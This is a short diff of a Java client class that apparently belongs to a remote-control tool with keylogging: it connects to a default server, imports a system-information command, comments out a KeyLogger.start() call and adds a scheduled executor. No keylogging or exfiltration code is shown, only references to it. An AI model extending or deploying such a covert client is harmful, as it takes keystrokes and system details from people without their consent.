@@ -12,19 +12,22 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.Socket;
 import java.net.SocketException;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
 
 import static utils.Command.COMMAND_CLIENT_SYSTEM_INFO;
 import static utils.Environment.DEFAULT_SERVER_HOST;
 import static utils.Environment.DEFAULT_SERVER_PORT;
 
 public class Client {
+    private static ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
     private Socket connection;
     private BufferedReader inputStream;
     private DataOutputStream outputStream;
 
     public Client() {
         Controller.init();
-        KeyLogger.start();
+//        KeyLogger.start();
     }
 
     public BufferedReader getInputStream() throws Exception {
@@ -76,6 +79,10 @@ public class Client {
             if (e instanceof SocketException) return;
             e.printStackTrace();
         }
+    }
+
+    public static ScheduledExecutorService getExecutorService() {
+        return executorService;
     }
 
     public static void main(String[] args) {
